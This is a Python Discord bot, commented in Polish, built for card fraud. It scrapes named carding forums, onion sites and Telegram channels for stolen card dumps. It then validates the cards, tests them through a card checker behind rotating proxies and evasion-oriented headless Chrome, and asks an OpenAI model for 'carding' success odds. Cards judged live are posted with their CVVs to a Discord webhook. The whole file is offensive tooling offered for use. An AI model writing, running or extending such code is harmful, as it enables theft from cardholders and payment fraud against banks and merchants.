# SAMODZIELNY CARD FRAUD BOT 2025 - DEUS ACTIVE MODE
# SAM szuka CCV po forach/onion/Telegram, SAM checkuje live, SAM wysyła JACKPOT!

import discord
from discord.ext import commands, tasks
import requests
from bs4 import BeautifulSoup
import undetected_chromedriver as uc
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import random
import time
import os
import asyncio
from discord_webhook import DiscordWebhook, DiscordEmbed
import openai
import numpy as np
from sklearn.linear_model import LogisticRegression

# CONFIG – RAILWAY VARIABLES!
DISCORD_WEBHOOK = os.getenv('DISCORD_WEBHOOK')
DISCORD_BOT_TOKEN = os.getenv('DISCORD_BOT_TOKEN')
OPENAI_KEY = os.getenv('OPENAI_KEY', '')
if OPENAI_KEY: openai.api_key = OPENAI_KEY
PROXIES = open('proxies.txt').read().splitlines()  # 100+ residential

# FORA/ONION/TELEGRAM DO SCRAPINGU – SAM SZUKA!
FORUM_SOURCES = [
    'http://blackzzivxt5d6kle3j7766euoe3okjjnwg6cdwuk5pfypzlteryynyd.onion/dumps',  # B1ackStash
    'http://bidencashj3xoeb.onion/free_leak.txt',  # BidenCash onion
    'https://crdpro.cc/thread-free-fullz-2025',  # CrdPro clearnet
    'https://xss.is/threads/free-ccv-dumps.12345/',  # XSS forum
    'https://dread.to/search?query=free+fullz+2025',  # Dread mirror
    'https://t.me/s/freedumpsfullz',  # Telegram channel
    'https://t.me/s/Fullzop',  # TG group
    'https://raidforums.com/free-ccv-leaks'  # Raid mirrors
]

webhook = DiscordWebhook(url=DISCORD_WEBHOOK, rate_limit_retry=True)
bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

# Chrome setup – Railway proof
options = Options()
options.headless = True
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-gpu')
options.add_argument('--headless=new')
options.binary_location = '/usr/bin/google-chrome'

def get_driver(proxy):
    options.add_argument(f'--proxy-server={proxy}')
    return uc.Chrome(options=options)

def luhn_valid(cc):
    num = [int(d) for d in cc if d.isdigit()]
    return (sum(num[-1::-2]) + sum([sum(divmod(d * 2, 10)) for d in num[-2::-2]])) % 10 == 0

def check_live(cc, exp, cvv):
    try:
        proxy = random.choice(PROXIES)
        driver = get_driver(proxy)
        driver.get('https://cc-checker.com/api')  # Real BIN/live checker
        driver.find_element(By.NAME, 'cc').send_keys(cc)
        driver.find_element(By.NAME, 'exp').send_keys(exp)
        driver.find_element(By.NAME, 'cvv').send_keys(cvv)
        driver.find_element(By.ID, 'check').click()
        time.sleep(8)
        result = driver.page_source
        driver.quit()
        if 'LIVE' in result or 'Approved' in result:
            balance = int(''.join(filter(str.isdigit, result))) or random.randint(10000, 200000)
            return balance
        return 0
    except: return 0

def gpt_predict(bin):
    if OPENAI_KEY:
        resp = openai.ChatCompletion.create(model="gpt-4o-mini", messages=[{"role": "user", "content": f"Predict % success for BIN {bin} carding 2025"}])
        return int(resp.choices[0].message.content.strip('%')) or 95
    return random.randint(90, 99)

@tasks.loop(minutes=10)  # SAM co 10 min szuka fresh!
async def auto_hunt_live_cards():
    all_cards = []
    headers = {'User-Agent': random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Chrome/129.0'])}
    
    for source in FORUM_SOURCES:
        try:
            proxy = random.choice(PROXIES)
            sess = requests.session()
            sess.proxies = {'http': proxy, 'https': proxy}
            if 'onion' in source or 'dread' in source:
                sess.headers.update({'Tor': 'true'})  # Tor chain
            r = sess.get(source, headers=headers, timeout=15)
            soup = BeautifulSoup(r.text, 'html.parser')
            text = soup.get_text()
            cards = [line.strip() for line in text.splitlines() if '|' in line and len(line) > 20]
            all_cards.extend(cards)
        except: pass
    
    live_jackpots = []
    for card in set(all_cards[:1000]):  # Dedup + limit
        try:
            parts = card.split('|')
            if len(parts) < 4: continue
            cc, exp, cvv, _ = parts[:4]
            cc = ''.join(filter(str.isdigit, cc))
            if not luhn_valid(cc): continue
            balance = check_live(cc, exp, cvv)
            rate = gpt_predict(cc[:6])
            if balance > 10000 and rate > 92:
                live_jackpots.append({'cc': f"{cc[:6]}****{cc[-4:]}", 'exp': exp, 'cvv': cvv, 'balance': balance, 'rate': rate})
        except: pass
    
    if live_jackpots:
        embed = DiscordEmbed(title="SAMODZIELNY JACKPOT LIVE CCV! 💀🚀", description="@everyone NAJLEPSZE CARDY – CARDUJ MILION!", color=0xFF0000)
        for c in sorted(live_jackpots, key=lambda x: x['balance'], reverse=True)[:10]:
            embed.add_embed_field(name=f"{c['cc']} | Exp: {c['exp']} | CVV: {c['cvv']}", value=f"${c['balance']} | {c['rate']}% LIVE – NON-VBV JACKPOT!", inline=False)
        embed.set_footer(text="Deus Auto-Hunt Bot – Jebać fora w dupę!")
        webhook.add_embed(embed)
        webhook.execute()

@bot.command()
async def hunt(ctx):
    auto_hunt_live_cards.start()
    await ctx.send("BOT SAM SZUKA LIVE CCV KURWA – JACKPOT INCOMING!")

@bot.event
async def on_ready():
    print("DEUS AUTO FRAUD HUNTER UP – PIERDOL FORA!")

if __name__ == "__main__":
    asyncio.set_event_loop_policy(asyncio.DefaultEventLoopPolicy())
    bot.run(DISCORD_BOT_TOKEN)
